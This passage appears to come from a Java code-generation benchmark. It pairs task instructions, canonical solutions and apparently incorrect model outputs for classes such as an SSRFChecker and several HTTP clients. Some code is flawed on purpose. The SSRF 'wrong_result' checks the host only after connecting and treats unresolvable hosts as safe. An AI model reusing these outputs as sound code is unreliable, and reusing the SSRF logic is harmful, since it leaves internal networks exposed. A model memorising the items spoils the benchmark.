    "wrong_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.CreateTopicsResult;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\n\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaTopicManager {\n\n    private AdminClient adminClient;\n\n    public AdminClient createAndConfigureAdminClient(String bootstrapServers) {\n        Map<String, Object> config = new HashMap<>();\n        config.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        return AdminClient.create(config);\n    }\n\n    public TopicDescription autoCreateMetricsTopic(AdminClient adminClient, String topicName) throws ExecutionException, InterruptedException {\n        NewTopic newTopic = new NewTopic(topicName, 1, (short) 1);\n        CreateTopicsResult result = adminClient.createTopics(Collections.singletonList(newTopic));\n        result.all().get();\n\n        DescribeTopicsResult describeResult = adminClient.describeTopics(Collections.singletonList(topicName));\n        return describeResult.values().get(topicName).get();\n    }\n}\n```"
  },
  {
    "Task_id": 91,
    "Instruction": "Task Description: Implement a Java class for SSRF (Server-Side Request Forgery) security checks that validates URLs to prevent internal network access.\n\nClass Description: The SSRFChecker class provides functionality to check if a given URL is safe by verifying it doesn't resolve to internal IP addresses. It includes methods for URL validation, host extraction, IP resolution, and internal IP detection.\n\nAttributes:\n- logger: Logger - Used for logging error and info messages\n- decimalIp: String - Stores converted IP address in decimal format\n\nMethods:\n- checkSSRF(String url, int checkTimes) -> boolean - Main method to validate URL against SSRF risks. Follows redirects up to checkTimes. Returns true if safe, false if dangerous.\n- isInternalIpByUrl(String url) -> boolean - Checks if URL's host resolves to an internal IP. Returns true if internal/dangerous.\n- isInternalIp(String strIP) -> boolean - Verifies if given IP is in blocked subnets. Returns true if IP is internal.\n- host2ip(String host) -> String - Resolves hostname to IP address. Returns empty string on failure.\n- url2host(String url) -> String - Extracts host from URL. Returns empty string for non-HTTP URLs or invalid URLs.\n- isOctalIP(String host) -> boolean - (Private) Checks if host is in octal IP format. Returns true if octal format detected.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.InetAddress;\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.ArrayList;\n\nimport org.apache.commons.lang.StringUtils;\nimport org.apache.commons.net.util.SubnetUtils;\nimport org.joychou.config.WebConfig;\nimport org.joychou.security.SecurityUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class SSRFChecker {\n\n    private static final Logger logger = LoggerFactory.getLogger(SSRFChecker.class);\n    private static String decimalIp;\n\n    public static boolean checkSSRF(String url, int checkTimes) {\n        HttpURLConnection connection;\n        int connectTime = 5 * 1000;\n        int i = 1;\n        String finalUrl = url;\n        try {\n            do {\n                if (isInternalIpByUrl(finalUrl)) {\n                    logger.error(\"[-] SSRF check failed. Dangerous url: \" + finalUrl);\n                    return false;\n                }\n\n                connection = (HttpURLConnection) new URL(finalUrl).openConnection();\n                connection.setInstanceFollowRedirects(false);\n                connection.setUseCaches(false);\n                connection.setConnectTimeout(connectTime);\n                connection.connect();\n                int responseCode = connection.getResponseCode();\n                if (responseCode >= 300 && responseCode <= 307 && responseCode != 304 && responseCode != 306) {\n                    String redirectedUrl = connection.getHeaderField(\"Location\");\n                    if (null == redirectedUrl)\n                        break;\n                    finalUrl = redirectedUrl;\n                    i += 1;\n                    logger.info(\"redirected url: \" + finalUrl);\n                    if (i == checkTimes) {\n                        return false;\n                    }\n                } else\n                    break;\n            } while (connection.getResponseCode() != HttpURLConnection.HTTP_OK);\n            connection.disconnect();\n        } catch (Exception e) {\n            return true;\n        }\n        return true;\n    }\n\n    public static boolean isInternalIpByUrl(String url) {\n        String host = url2host(url);\n        if (host.equals(\"\")) {\n            return true;\n        }\n\n        String ip = host2ip(host);\n        if (ip.equals(\"\")) {\n            return true;\n        }\n\n        return isInternalIp(ip);\n    }\n\n    public static boolean isInternalIp(String strIP) {\n        if (StringUtils.isEmpty(strIP)) {\n            logger.error(\"[-] SSRF check failed. IP is empty. \" + strIP);\n            return true;\n        }\n\n        ArrayList<String> blackSubnets = WebConfig.getSsrfBlockIps();\n        for (String subnet : blackSubnets) {\n            SubnetUtils utils = new SubnetUtils(subnet);\n            if (utils.getInfo().isInRange(strIP)) {\n                logger.error(\"[-] SSRF check failed. Internal IP: \" + strIP);\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    public static String host2ip(String host) {\n        if (null == host) {\n            return \"\";\n        }\n\n        if(isOctalIP(host)) {\n            host = decimalIp;\n        }\n\n        try {\n            InetAddress IpAddress = InetAddress.getByName(host);\n            return IpAddress.getHostAddress();\n        } catch (Exception e) {\n            logger.error(\"host2ip exception \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    private static String url2host(String url) {\n        try {\n            URI u = new URI(url);\n            if (SecurityUtil.isHttp(url)) {\n                return u.getHost();\n            }\n            return \"\";\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.*;\nimport java.util.regex.Pattern;\nimport org.apache.commons.validator.routines.InetAddressValidator;\n\npublic class SSRFChecker {\n    private static final Logger logger = Logger.getLogger(SSRFChecker.class.getName());\n    private String decimalIp;\n\n    public boolean checkSSRF(String url, int checkTimes) throws Exception {\n        if (checkTimes <= 0) {\n            return false;\n        }\n\n        URL u = new URL(url);\n        HttpURLConnection conn = (HttpURLConnection) u.openConnection();\n        conn.setInstanceFollowRedirects(false);\n        conn.setRequestMethod(\"HEAD\");\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode >= 300 && responseCode < 400) {\n            String redirectUrl = conn.getHeaderField(\"Location\");\n            if (redirectUrl != null) {\n                return checkSSRF(redirectUrl, checkTimes - 1);\n            }\n        }\n\n        return isInternalIpByUrl(url);\n    }\n\n    public boolean isInternalIpByUrl(String url) {\n        String host = url2host(url);\n        if (host.isEmpty()) {\n            return false;\n        }\n\n        String ip = host2ip(host);\n        if (ip.isEmpty()) {\n            return false;\n        }\n\n        return isInternalIp(ip);\n    }\n\n    public boolean isInternalIp(String strIP) {\n        InetAddressValidator validator = InetAddressValidator.getInstance();\n        if (!validator.isValidInet4Address(strIP)) {\n            return false;\n        }\n\n        long ipLong = ipToLong(strIP);\n\n        long[] privateRanges = {\n            ipToLong(\"10.0.0.0\"), ipToLong(\"10.255.255.255\"),\n            ipToLong(\"172.16.0.0\"), ipToLong(\"172.31.255.255\"),\n            ipToLong(\"192.168.0.0\"), ipToLong(\"192.168.255.255\"),\n            ipToLong(\"127.0.0.0\"), ipToLong(\"127.255.255.255\")\n        };\n\n        for (int i = 0; i < privateRanges.length; i += 2) {\n            if (ipLong >= privateRanges[i] && ipLong <= privateRanges[i + 1]) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    public String host2ip(String host) {\n        try {\n            InetAddress address = InetAddress.getByName(host);\n            return address.getHostAddress();\n        } catch (UnknownHostException e) {\n            logger.severe(\"Failed to resolve host: \" + host + \", error: \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    public String url2host(String url) {\n        try {\n            URL u = new URL(url);\n            if (!u.getProtocol().toLowerCase().matches(\"https?\")) {\n                return \"\";\n            }\n            return u.getHost();\n        } catch (MalformedURLException e) {\n            logger.severe(\"Invalid URL format: \" + url + \", error: \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    private boolean isOctalIP(String host) {\n        Pattern octalPattern = Pattern.compile(\"^([0-7]{1,3}\\\\.){3}[0-7]{1,3}$\");\n        return octalPattern.matcher(host).matches();\n    }\n\n    private long ipToLong(String ipAddress) {\n        String[] parts = ipAddress.split(\"\\\\.\");\n        long result = 0;\n        for (int i = 0; i < 4; i++) {\n            int part = Integer.parseInt(parts[i]);\n            result |= ((long) part) << (24 - (i * 8));\n        }\n        return result;\n    }\n}"
  },
  {
    "Task_id": 93,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests with support for proxy configuration, including making GET requests, processing responses, and handling callbacks for success and failure scenarios.\n\nClass Description: The HttpRequestManager class manages HTTP requests with configurable proxy settings. It provides functionality to make GET requests to a specified URL, process the response (including Base64 decoding), and notify the caller of success or failure through a callback interface.\n\nAttributes:\n- mProxyOn: boolean - Indicates whether proxy is enabled\n- mProxyHost: String - The host address of the proxy server\n- mProxyPort: long - The port number of the proxy server\n\nMethods:\n- HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) -> void - Constructor that initializes proxy configuration\n- requestSubscribeServerConfigs(String urlStr, Callback callback) -> void - Makes a GET request to the specified URL and processes the response, notifying through callback\n- readStringFromStream(InputStream inputStream) -> String - Helper method to read and convert an InputStream to a String\n- interface Callback - Nested interface for handling request results\n  - onSuccess(String response) -> void - Called when request succeeds\n  - onFailed() -> void - Called when request fails",
    "Canonical_solution": "import android.net.Uri;\nimport android.text.TextUtils;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Objects;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class HttpRequestManager {\n    private boolean mProxyOn;\n    private String mProxyHost;\n    private long mProxyPort;\n\n    public HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) {\n        mProxyOn = proxyOn;\n        mProxyHost = proxyHost;\n        mProxyPort = proxyPort;\n    }\n\n    public void requestSubscribeServerConfigs(String urlStr, @NonNull Callback callback) {\n        URL url;\n        try {\n            url = new URL(urlStr);\n        } catch (MalformedURLException e) {\n            e.printStackTrace();\n            callback.onFailed();\n            return;\n        }\n        HttpURLConnection connection = null;\n        try {\n            if (mProxyOn) {\n                InetSocketAddress proxyAddress = new InetSocketAddress(mProxyHost, (int) mProxyPort);\n                Proxy proxy = new Proxy(Proxy.Type.SOCKS, proxyAddress);\n                connection = (HttpURLConnection) url.openConnection(proxy);\n            } else {\n                connection = (HttpURLConnection) url.openConnection();\n            }\n            connection.setReadTimeout(10000);\n            connection.setConnectTimeout(10000);\n            connection.setRequestMethod(\"GET\");\n            connection.setDoInput(true);\n            connection.connect();\n            int responseCode = connection.getResponseCode();\n            if (responseCode != HttpsURLConnection.HTTP_OK) {\n                callback.onFailed();\n                return;\n            }\n            try (InputStream stream = connection.getInputStream()) {\n                if (stream != null) {\n                    @Nullable String response = DecodeUtils.decodeBase64(readStringFromStream(stream));\n                    if (TextUtils.isEmpty(response)) {\n                        callback.onFailed();\n                    } else {\n                        callback.onSuccess(response);\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            callback.onFailed();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private String readStringFromStream(InputStream inputStream) {\n        try (Reader reader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {\n            char[] buf = new char[4096];\n            StringBuilder sb = new StringBuilder();\n            int readSize;\n            while ((readSize = reader.read(buf)) != -1) {\n                sb.append(buf, 0, readSize);\n            }\n            return sb.toString();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public interface Callback {\n        void onSuccess(String response);\n        void onFailed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.util.Base64;\n\npublic class HttpRequestManager {\n    private boolean mProxyOn;\n    private String mProxyHost;\n    private long mProxyPort;\n\n    public HttpRequestManager(boolean proxyOn, String proxyHost, long proxyPort) {\n        this.mProxyOn = proxyOn;\n        this.mProxyHost = proxyHost;\n        this.mProxyPort = proxyPort;\n    }\n\n    public void requestSubscribeServerConfigs(String urlStr, Callback callback) {\n        try {\n            URL url = new URL(urlStr);\n            Proxy proxy = null;\n            if (mProxyOn && mProxyHost != null && mProxyHost.length() > 0) {\n                InetSocketAddress addr = new InetSocketAddress(mProxyHost, (int)mProxyPort);\n                proxy = new Proxy(Proxy.Type.HTTP, addr);\n            }\n\n            HttpURLConnection conn;\n            if (proxy != null) {\n                conn = (HttpURLConnection) url.openConnection(proxy);\n            } else {\n                conn = (HttpURLConnection) url.openConnection();\n            }\n\n            conn.setRequestMethod(\"GET\");\n            int responseCode = conn.getResponseCode();\n\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                InputStream inputStream = conn.getInputStream();\n                String response = readStringFromStream(inputStream);\n                callback.onSuccess(response);\n            } else {\n                callback.onFailed();\n            }\n        } catch (Exception e) {\n            callback.onFailed();\n        }\n    }\n\n    private String readStringFromStream(InputStream inputStream) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder sb = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line);\n        }\n        reader.close();\n        return Base64.getDecoder().decode(sb.toString()).toString();\n    }\n\n    public interface Callback {\n        void onSuccess(String response);\n        void onFailed();\n    }\n}\n```"
  },
  {
    "Task_id": 94,
    "Instruction": "Task Description: Implement a lightweight HTTP client class in Java that can perform GET and POST requests with configurable headers, parameters, and timeouts.\n\nClass Description: HttpTinyClient is a utility class that provides basic HTTP GET and POST functionality using Java's HttpURLConnection. It handles URL parameter encoding, header management, and response processing.\n\nAttributes:\nNone (This is a utility class with only static methods)\n\nMethods:\n\nMethod1: httpGet(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) -> HttpResult - Performs an HTTP GET request to the specified URL with given headers and parameters. Encodes parameters in the URL query string.\n\nMethod2: httpPost(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) -> HttpResult - Performs an HTTP POST request to the specified URL with given headers and parameters. Encodes parameters in the request body.\n\nMethod3: encodingParams(List<String> paramValues, String encoding) -> String - Helper method that encodes parameter values for URL or POST body using the specified character encoding.\n\nMethod4: setHeaders(HttpURLConnection conn, List<String> headers, String encoding) -> void - Helper method that sets request headers including default headers for content type and client version.\n\nNested Class: HttpResult - Represents the result of an HTTP request with status code and response content.\n\nAttributes:\ncode: int - HTTP response status code\ncontent: String - Response body content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.util.Iterator;\nimport java.util.List;\nimport org.apache.rocketmq.common.MQVersion;\nimport org.apache.rocketmq.common.MixAll;\n\npublic class HttpTinyClient {\n\n    static public HttpResult httpGet(String url, List<String> headers, List<String> paramValues,\n        String encoding, long readTimeoutMs) throws IOException {\n        String encodedContent = encodingParams(paramValues, encoding);\n        url += (null == encodedContent) ? \"\" : (\"?\" + encodedContent);\n\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.setConnectTimeout((int) readTimeoutMs);\n            conn.setReadTimeout((int) readTimeoutMs);\n            setHeaders(conn, headers, encoding);\n\n            conn.connect();\n            int respCode = conn.getResponseCode();\n            String resp = null;\n\n            if (HttpURLConnection.HTTP_OK == respCode) {\n                resp = IOTinyUtils.toString(conn.getInputStream(), encoding);\n            } else {\n                resp = IOTinyUtils.toString(conn.getErrorStream(), encoding);\n            }\n            return new HttpResult(respCode, resp);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    static private String encodingParams(List<String> paramValues, String encoding)\n        throws UnsupportedEncodingException {\n        StringBuilder sb = new StringBuilder();\n        if (null == paramValues) {\n            return null;\n        }\n\n        for (Iterator<String> iter = paramValues.iterator(); iter.hasNext(); ) {\n            sb.append(iter.next()).append(\"=\");\n            sb.append(URLEncoder.encode(iter.next(), encoding));\n            if (iter.hasNext()) {\n                sb.append(\"&\");\n            }\n        }\n        return sb.toString();\n    }\n\n    static private void setHeaders(HttpURLConnection conn, List<String> headers, String encoding) {\n        if (null != headers) {\n            for (Iterator<String> iter = headers.iterator(); iter.hasNext(); ) {\n                conn.addRequestProperty(iter.next(), iter.next());\n            }\n        }\n        conn.addRequestProperty(\"Client-Version\", MQVersion.getVersionDesc(MQVersion.CURRENT_VERSION));\n        conn.addRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded;charset=\" + encoding);\n\n        String ts = String.valueOf(System.currentTimeMillis());\n        conn.addRequestProperty(\"Metaq-Client-RequestTS\", ts);\n    }\n\n    static public HttpResult httpPost(String url, List<String> headers, List<String> paramValues,\n        String encoding, long readTimeoutMs) throws IOException {\n        String encodedContent = encodingParams(paramValues, encoding);\n\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(3000);\n            conn.setReadTimeout((int) readTimeoutMs);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            setHeaders(conn, headers, encoding);\n\n            conn.getOutputStream().write(encodedContent.getBytes(MixAll.DEFAULT_CHARSET));\n\n            int respCode = conn.getResponseCode();\n            String resp = null;\n\n            if (HttpURLConnection.HTTP_OK == respCode) {\n                resp = IOTinyUtils.toString(conn.getInputStream(), encoding);\n            } else {\n                resp = IOTinyUtils.toString(conn.getErrorStream(), encoding);\n            }\n            return new HttpResult(respCode, resp);\n        } finally {\n            if (null != conn) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    static public class HttpResult {\n        final public int code;\n        final public String content;\n\n        public HttpResult(int code, String content) {\n            this.code = code;\n            this.content = content;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class HttpTinyClient {\n    private static final String USER_AGENT = \"HttpTinyClient/1.0\";\n    \n    public static HttpResult httpGet(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) throws IOException {\n        StringBuilder encodedParams = new StringBuilder();\n        if (paramValues != null && !paramValues.isEmpty()) {\n            for (int i = 0; i < paramValues.size(); i += 2) {\n                if (i > 0) encodedParams.append(\"&\");\n                encodedParams.append(URLEncoder.encode(paramValues.get(i), encoding));\n                encodedParams.append(\"=\");\n                encodedParams.append(URLEncoder.encode(paramValues.get(i + 1), encoding));\n            }\n        }\n        \n        URL fullUrl = new URL(url + (encodedParams.length() > 0 ? \"?\" + encodedParams.toString() : \"\"));\n        HttpURLConnection conn = (HttpURLConnection) fullUrl.openConnection();\n        \n        setHeaders(conn, headers, encoding);\n        conn.setRequestMethod(\"GET\");\n        conn.setConnectTimeout((int) Math.min(Integer.MAX_VALUE, readTimeoutMs));\n        conn.setReadTimeout((int) Math.min(Integer.MAX_VALUE, readTimeoutMs));\n        \n        return processResponse(conn);\n    }\n\n    public static HttpResult httpPost(String url, List<String> headers, List<String> paramValues, String encoding, long readTimeoutMs) throws IOException {\n        URL obj = new URL(url);\n        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n        \n        setHeaders(conn, headers, encoding);\n        conn.setRequestMethod(\"POST\");\n        conn.setConnectTimeout((int) Math.min(Integer.MAX_VALUE, readTimeoutMs));\n        conn.setReadTimeout((int) Math.min(Integer.MAX_VALUE, readTimeoutMs));\n        conn.setDoOutput(true);\n        \n        if (paramValues != null && !paramValues.isEmpty()) {\n            String encodedParams = encodingParams(paramValues, encoding);\n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(encodedParams.getBytes(encoding));\n            }\n        }\n        \n        return processResponse(conn);\n    }\n\n    public static String encodingParams(List<String> paramValues, String encoding) throws UnsupportedEncodingException {\n        StringBuilder result = new StringBuilder();\n        for (int i = 0; i < paramValues.size(); i += 2) {\n            if (i > 0) result.append(\"&\");\n            result.append(URLEncoder.encode(paramValues.get(i), encoding));\n            result.append(\"=\");\n            result.append(URLEncoder.encode(paramValues.get(i + 1), encoding));\n        }\n        return result.toString();\n    }\n\n    public static void setHeaders(HttpURLConnection conn, List<String> headers, String encoding) {\n        conn.setRequestProperty(\"User-Agent\", USER_AGENT);\n        conn.setRequestProperty(\"Accept-Charset\", encoding);\n        \n        if (headers != null) {\n            for (String header : headers) {\n                String[] parts = header.split(\":\", 2);\n                if (parts.length == 2) {\n                    conn.setRequestProperty(parts[0].trim(), parts[1].trim());\n                }\n            }\n        }\n    }\n\n    private static HttpResult processResponse(HttpURLConnection conn) throws IOException {\n        int responseCode = conn.getResponseCode();\n        BufferedReader reader;\n        if (responseCode >= 400) {\n            reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()));\n        } else {\n            reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        }\n        \n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n        \n        return new HttpResult(responseCode, response.toString());\n    }\n\n    public static class HttpResult {\n        public final int code;\n        public final String content;\n\n        public HttpResult(int code, String content) {\n            this.code = code;\n            this.content = content;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests (GET and POST) to a REST API, with support for custom headers, query parameters, and JSON serialization/deserialization.\n\nClass Description: The ApiHandler class provides a convenient way to make HTTP requests to a REST API endpoint. It supports both GET and POST methods, handles query parameters, includes custom headers (like API keys), and automatically serializes/deserializes JSON data using Gson. The class maintains a base URL and optional additional headers that are included in every request.\n\nAttributes:\n- baseUrl: String - The base URL for all API requests\n- additionalHeaders: Map<String, String> - Optional headers to include in all requests\n\nMethods:\n- Constructor: ApiHandler(String url) - Initializes the handler with a base URL\n- Constructor: ApiHandler(String url, String apiKey) - Initializes with base URL and sets an API key header\n- get: <T> get(String endpoint, Class<T> tClass) -> T - Makes a GET request to the endpoint and returns deserialized response\n- get: <T> get(String endpoint, HashMap<String, Object> query, Class<T> tClass) -> T - Makes a GET request with query parameters\n- post: <T> post(String endpoint, T body, Class<T> tClass) -> T - Makes a POST request with a request body\n- post: <T> post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) -> T - Makes a POST request with query parameters and body\n- getRaw: static String getRaw(Map<String, String> headers, String url) -> String - Makes a raw GET request and returns response as string\n- postRaw: static String postRaw(Map<String, String> headers, String url, String body) -> String - Makes a raw POST request and returns response as string\n- addHeaders: static void addHeaders(HttpURLConnection connection, Map<String, String> headers) - Helper to add headers to a connection\n- parseQueries: static String parseQueries(HashMap<String, Object> query) -> String - Converts query parameters to URL encoded string\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) -> T - Makes GET request to full URL and deserializes response\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) -> T - GET with query params to full URL\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) -> T - POST to full URL with body\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) -> T - POST with query params to full URL\n- urlEncodeUTF8: static String urlEncodeUTF8(String input) -> String - URL encodes a string using UTF-8",
    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\nimport com.google.gson.Gson;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Objects;\n\npublic class ApiHandler {\n    public final String baseUrl;\n    public final Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        baseUrl = url;\n        additionalHeaders = null;\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        baseUrl = url;\n        additionalHeaders = new ArrayMap<>();\n        additionalHeaders.put(\"x-api-key\", apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) {\n        Log.d(\"ApiHandler\", url);\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            addHeaders(conn, headers);\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            Log.d(ApiHandler.class.toString(), data);\n            inputStream.close();\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) {\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"Accept\", \"application/json\");\n            addHeaders(conn, headers);\n            conn.setDoOutput(true);\n\n            OutputStream outputStream = conn.getOutputStream();\n            byte[] input = body.getBytes(StandardCharsets.UTF_8);\n            outputStream.write(input, 0, input.length);\n            outputStream.close();\n\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            inputStream.close();\n\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    private static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        if(headers != null) {\n            for(String key : headers.keySet())\n                connection.addRequestProperty(key, headers.get(key));\n        }\n    }\n\n    private static String parseQueries(HashMap<String, Object> query) {\n        StringBuilder params = new StringBuilder(\"?\");\n        for (String param : query.keySet()) {\n            String value = Objects.toString(query.get(param));\n            params.append(urlEncodeUTF8(param))\n                    .append(\"=\")\n                    .append(urlEncodeUTF8(value))\n                    .append(\"&\");\n        }\n        return params.substring(0, params.length() - 1);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) {\n        return new Gson().fromJson(getRaw(headers, url), tClass);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(headers, url + parseQueries(query), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url, body.toString()), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url + parseQueries(query), body.toString()), tClass);\n    }\n\n    private static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\");\n        }catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"UTF-8 is required\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport com.google.gson.*;\n\npublic class ApiHandler {\n    private String baseUrl;\n    private Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        this.baseUrl = url;\n        this.additionalHeaders = new HashMap<>();\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        this(url);\n        if (apiKey != null && !apiKey.isEmpty()) {\n            additionalHeaders.put(\"Authorization\", \"Bearer \" + apiKey);\n        }\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) throws IOException {\n        return getFullUrl(additionalHeaders, baseUrl + endpoint, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) throws IOException {\n        return getFullUrl(additionalHeaders, baseUrl + endpoint, query, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) throws IOException {\n        return postFullUrl(additionalHeaders, baseUrl + endpoint, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) throws IOException {\n        return postFullUrl(additionalHeaders, baseUrl + endpoint, query, body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) throws IOException {\n        URL obj = new URL(url);\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n        addHeaders(con, headers);\n        con.setRequestMethod(\"GET\");\n\n        int responseCode = con.getResponseCode();\n        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n        return response.toString();\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) throws IOException {\n        URL obj = new URL(url);\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n        addHeaders(con, headers);\n        con.setRequestMethod(\"POST\");\n        con.setDoOutput(true);\n\n        try (OutputStream os = con.getOutputStream()) {\n            byte[] input = body.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        int responseCode = con.getResponseCode();\n        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n        return response.toString();\n    }\n\n    public static void addHeaders(HttpURLConnection connection, Map<String, String> headers) 